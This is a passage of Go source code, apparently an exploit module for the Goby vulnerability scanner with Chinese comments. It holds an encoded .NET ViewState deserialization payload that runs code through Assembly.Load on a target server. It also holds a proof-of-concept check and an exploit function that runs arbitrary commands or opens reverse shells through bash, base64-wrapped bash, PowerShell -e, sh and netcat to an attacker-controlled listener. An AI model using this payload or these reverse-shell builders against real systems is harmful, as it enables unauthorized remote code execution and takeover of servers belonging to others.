W9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQZQAAAA1QFTeXN0ZW0uRnVuY2AyW1tTeXN0ZW0uQnl0ZVtdLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JPgAAAAoJPgAAAAZSAAAAGlN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5BlMAAAAETG9hZAoEQwAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgcAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1lCVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMIDVN5c3RlbS5UeXBlW10JUwAAAAk%2BAAAACVIAAAAGVgAAACdTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSBMb2FkKEJ5dGVbXSkGVwAAAC5TeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSBMb2FkKFN5c3RlbS5CeXRlW10pCAAAAAoBRAAAAEIAAAAGWAAAAMwCU3lzdGVtLkZ1bmNgMltbU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHksIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhYmxlYDFbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JPgAAAAoJPgAAAAlSAAAABlsAAAAIR2V0VHlwZXMKAUUAAABDAAAACVsAAAAJPgAAAAlSAAAABl4AAAAYU3lzdGVtLlR5cGVbXSBHZXRUeXBlcygpBl8AAAAYU3lzdGVtLlR5cGVbXSBHZXRUeXBlcygpCAAAAAoBRgAAAEIAAAAGYAAAALYDU3lzdGVtLkZ1bmNgMltbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmFibGVgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYXRvcmAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCT4AAAAKCT4AAAAGYgAAAIQBU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmFibGVgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBmMAAAANR2V0RW51bWVyYXRvcgoBRwAAAEMAAAAJYwAAAAk%2BAAAACWIAAAAGZgAAAEVTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYXRvcmAxW1N5c3RlbS5UeXBlXSBHZXRFbnVtZXJhdG9yKCkGZwAAAJQBU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmF0b3JgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dIEdldEVudW1lcmF0b3IoKQgAAAAKAUgAAABCAAAABmgAAADAAlN5c3RlbS5GdW5jYDJbW1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhdG9yYDFbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkJvb2xlYW4sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dCT4AAAAKCT4AAAAGagAAAB5TeXN0ZW0uQ29sbGVjdGlvbnMuSUVudW1lcmF0b3IGawAAAAhNb3ZlTmV4dAoBSQAAAEMAAAAJawAAAAk%2BAAAACWoAAAAGbgAAABJCb29sZWFuIE1vdmVOZXh0KCkGbwAAABlTeXN0ZW0uQm9vbGVhbiBNb3ZlTmV4dCgpCAAAAAoBSgAAAEIAAAAGcAAAAL0CU3lzdGVtLkZ1bmNgMltbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmF0b3JgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JPgAAAAoJPgAAAAZyAAAAhAFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYXRvcmAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GcwAAAAtnZXRfQ3VycmVudAoBSwAAAEMAAAAJcwAAAAk%2BAAAACXIAAAAGdgAAABlTeXN0ZW0uVHlwZSBnZXRfQ3VycmVudCgpBncAAAAZU3lzdGVtLlR5cGUgZ2V0X0N1cnJlbnQoKQgAAAAKAUwAAABCAAAABngAAADGAVN5c3RlbS5GdW5jYDJbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uT2JqZWN0LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQk%2BAAAACgk%2BAAAABnoAAAAQU3lzdGVtLkFjdGl2YXRvcgZ7AAAADkNyZWF0ZUluc3RhbmNlCgFNAAAAQwAAAAl7AAAACT4AAAAJegAAAAZ%2BAAAAKVN5c3RlbS5PYmplY3QgQ3JlYXRlSW5zdGFuY2UoU3lzdGVtLlR5cGUpBn8AAAApU3lzdGVtLk9iamVjdCBDcmVhdGVJbnN0YW5jZShTeXN0ZW0uVHlwZSkIAAAACgFOAAAADwAAAAaAAAAAJlN5c3RlbS5Db21wb25lbnRNb2RlbC5EZXNpZ24uQ29tbWFuZElEBAAAAAk6AAAAEE8AAAACAAAACYIAAAAICAAgAAAEggAAAAtTeXN0ZW0uR3VpZAsAAAACX2ECX2ICX2MCX2QCX2UCX2YCX2cCX2gCX2kCX2oCX2sAAAAAAAAAAAAAAAgHBwICAgICAgICExPSdO4q0RGL%2BwCgyQ8m9wsLfW3lPHcqhM8jewcv5VJIqA7wqWA%3D&__VIEWSTATEGENERATOR=60AF4756"

		resp, err := setPostRequest(hostInfo, url, data, header)
		if err != nil || resp.StatusCode != 200 {
			return "", "", err
		}

		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败
		commandResult := resp.RawBody

		return commandResult, url, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash0001

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash0001

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
